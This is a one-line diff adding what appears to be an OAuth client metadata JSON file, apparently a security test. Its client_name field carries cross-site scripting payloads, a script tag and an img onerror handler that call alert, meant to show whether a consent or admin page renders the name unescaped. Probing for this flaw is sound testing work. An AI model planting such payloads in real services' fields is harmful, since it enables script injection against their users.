@@ -1,0 +1,1 @@
+{"client_id":"https://raw.githubusercontent.com/hiepck/cimd-test-openctem/main/xss.json","client_name":"<script>alert(document.domain)</script><img src=x onerror=alert(1)>","redirect_uris":["https://example.com/cb"],"grant_types":["authorization_code"],"response_types":["code"],"token_endpoint_auth_method":"none"}
